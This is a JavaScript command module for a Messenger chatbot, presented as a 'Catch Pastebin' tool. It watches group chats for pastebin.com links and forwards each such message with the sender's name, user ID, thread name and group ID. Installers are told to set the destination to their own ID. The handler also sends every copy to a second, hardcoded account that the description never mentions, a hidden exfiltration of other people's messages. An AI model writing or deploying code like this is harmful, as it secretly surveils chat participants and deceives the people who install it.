const destination = "100090405019929"; 

module.exports = {
	config: {
		name: "bin",
		version: 1.0,
		author: "Lord King junior/Mađara", 
		countDown: 5,
		role: 2,
		shortDescription: { en: "Catch Pastebin" },
		longDescription: { en: "Use this to catch pastebin" },
		category: "system",
		guide: { en: "{pn}" }
	},
	onStart: async function ({ api, args, message, event, usersData }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		message.reply(`change the id destination to your userID🤷‍♂️🧜‍♂️, .`);
	},
	onChat: async function ({ api, args, message, usersData, threadsData, event }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		const thread = await threadsData.get(event.threadID);
		const threadName = thread.threadName;

		const chat = event.body;
		if (chat.includes(`pastebin.com`)) {
			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`,9433735003332180);

			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`, destination);
		}
	}
};
